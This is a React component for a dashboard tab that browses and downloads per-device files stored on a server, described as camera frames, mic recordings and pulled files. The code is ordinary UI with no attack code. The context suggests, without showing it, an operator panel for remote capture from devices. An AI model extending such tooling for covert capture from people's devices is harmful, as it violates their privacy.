
import { useState } from 'react'
import { Button } from '@/components/ui/button'
import {
  Folder,
  File as FileIcon,
  ChevronLeft,
  RefreshCw,
  Download,
  HardDrive,
  Loader2,
  FileArchive,
  FileText,
  Music,
  Image as ImageIcon,
} from 'lucide-react'
import { useListDownloadsQuery } from '@/store/api/backend-api'
import { formatBytes, classNames } from '@/lib/format'

// Browse the server's Downloads/<clientId>/... folder and download any file.
// Calls GET /api/list?path=<rel>  (server.js lists the folder).
export function DownloadedTab({ clientId }: { clientId: string }) {
  const [path, setPath] = useState<string>(clientId)
  const { data, isLoading, refetch } = useListDownloadsQuery(path)
  const entries = data?.entries ?? []

  const goBack = () => {
    const parts = path.split('/')
    if (parts.length > 1) {
      parts.pop()
      setPath(parts.join('/'))
    }
  }
  const open = (e: { isDir: boolean; url: string; name: string }) => {
    if (e.isDir) {
      // url = /Downloads/<clientId>/<sub> → strip "/Downloads/" prefix → set path
      const rel = e.url.replace(/^\/Downloads\//, '')
      setPath(rel)
    } else {
      // open the file URL (download) in a new tab
      window.open(e.url, '_blank', 'noopener')
    }
  }

  const iconFor = (name: string, isDir: boolean) => {
    if (isDir) return <Folder className="h-4 w-4 text-emerald-400" />
    const ext = name.split('.').pop()?.toLowerCase()
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext || ''))
      return <ImageIcon className="h-4 w-4 text-teal-300" />
    if (['mp3', 'wav', 'aac', 'pcm', 'm4a'].includes(ext || ''))
      return <Music className="h-4 w-4 text-amber-300" />
    if (['zip'].includes(ext || '')) return <FileArchive className="h-4 w-4 text-zinc-300" />
    if (['json', 'txt', 'md', 'log'].includes(ext || ''))
      return <FileText className="h-4 w-4 text-zinc-300" />
    return <FileIcon className="h-4 w-4 text-zinc-400" />
  }

  const dirs = entries.filter((e) => e.isDir)
  const files = entries.filter((e) => !e.isDir)
  const totalSize = files.reduce((s, f) => s + (f.size || 0), 0)

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2 flex-wrap">
        <HardDrive className="h-4 w-4 text-emerald-400 shrink-0" />
        <h3 className="text-sm font-semibold text-zinc-100">Downloaded Files</h3>
        <code className="text-[11px] text-zinc-400 font-mono truncate flex-1 bg-black/40 px-2 py-1 rounded border border-white/10 min-w-0">
          Downloads/{path}
        </code>
      </div>
      <p className="text-xs text-zinc-500">
        Files saved on the server for this device (camera frames, mic recordings,
        pulled files, zips). Click a file to download it.
      </p>

      {/* Toolbar */}
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={goBack}
          disabled={path === clientId || path === ''}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <ChevronLeft className="h-4 w-4" /> Up
        </Button>
        <Button
          variant="outline"
          size="sm"
          onClick={() => refetch()}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
        <span className="ml-auto text-[11px] text-zinc-500">
          {dirs.length} folders · {files.length} files
          {files.length > 0 && ` · ${formatBytes(totalSize)}`}
        </span>
      </div>

      {/* Listing */}
      <div className="rounded-xl border border-white/10 bg-black/30 overflow-hidden">
        {isLoading ? (
          <div className="px-4 py-10 text-center text-xs text-zinc-600 flex items-center justify-center gap-2">
            <Loader2 className="h-4 w-4 animate-spin text-emerald-400" /> Loading…
          </div>
        ) : entries.length === 0 ? (
          <div className="px-4 py-10 text-center text-xs text-zinc-600">
            This folder is empty.
          </div>
        ) : (
          <div className="divide-y divide-white/5">
            {[
              ...dirs.sort((a, b) => a.name.localeCompare(b.name)),
              ...files.sort((a, b) => (b.mtime || 0) - (a.mtime || 0)),
            ].map((e, i) => (
              <div
                key={i}
                onClick={() => open(e)}
                className="group flex items-center gap-3 px-3 py-2 hover:bg-emerald-500/[0.04] cursor-pointer"
              >
                <span className="shrink-0">{iconFor(e.name, e.isDir)}</span>
                <span className="flex-1 truncate text-sm text-zinc-200">{e.name}</span>
                {e.isDir ? (
                  <span className="text-[10px] text-zinc-600">folder</span>
                ) : (
                  <>
                    <span className="text-[11px] text-zinc-500">{formatBytes(e.size)}</span>
                    {e.mtime && (
                      <span className="text-[10px] text-zinc-600 hidden sm:inline">
                        {new Date(e.mtime).toLocaleString()}
                      </span>
                    )}
                    <a
                      href={e.url}
                      target="_blank"
                      rel="noreferrer"
                      onClick={(ev) => ev.stopPropagation()}
                      className="grid h-6 w-6 place-items-center rounded text-zinc-500 hover:text-emerald-300 opacity-0 group-hover:opacity-100"
                      title="Download"
                    >
                      <Download className="h-3.5 w-3.5" />
                    </a>
                  </>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
